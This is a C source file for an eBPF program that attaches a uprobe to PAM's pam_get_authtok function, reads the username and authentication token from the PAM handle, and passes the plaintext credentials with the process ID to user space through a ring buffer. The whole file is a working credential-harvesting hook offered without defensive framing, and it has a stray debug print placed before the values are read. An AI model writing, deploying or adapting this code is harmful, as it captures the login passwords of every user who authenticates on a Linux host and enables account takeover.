#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/usdt.bpf.h>

struct event {
	int pid;
	char username[512];
	char password[512];
};

struct {
	__uint(type, BPF_MAP_TYPE_RINGBUF);
	__uint(max_entries, 256 * 1024);
} kernel_ring_buffer SEC(".maps");

typedef struct pam_handle {
	char *authtok;
	unsigned caller_is;
	void *pam_conversation;
	char *oldauthtok;
	char *prompt; /* for use by pam_get_user() */
	char *service_name;
	char *user;
	char *rhost;
	char *ruser;
	char *tty;
	char *xdisplay;
	char *authtok_type; /* PAM_AUTHTOK_TYPE */
	void *data;
	void *env; /* structure to maintain environment list */
} pam_handle_t;

char LICENSE[] SEC("license") = "Dual BSD/GPL";

int my_pid = 0;

SEC("uprobe")
int uprobe_pam_get_authtok(struct pt_regs *ctx)
{
	if (!PT_REGS_PARM1(ctx))
		return 0;
	pam_handle_t *pamh = (pam_handle_t *)PT_REGS_PARM1(ctx);
	u64 username_addr = 0;
	u64 password_addr = 0;
	bpf_printk("Username: %s Password: %s", (char *)username_addr, (char *)password_addr);
	u64 pid = bpf_get_current_pid_tgid() >> 32;
	bpf_probe_read(&username_addr, sizeof(username_addr), &pamh->user);
	bpf_probe_read(&password_addr, sizeof(password_addr), &pamh->authtok);
	struct event *e;
	e = bpf_ringbuf_reserve(&kernel_ring_buffer, sizeof(*e), 0);
	if (!e)
		return 1;
	e->pid = pid;
	bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
	bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
	bpf_ringbuf_submit(e, 0);
	return 0;
}
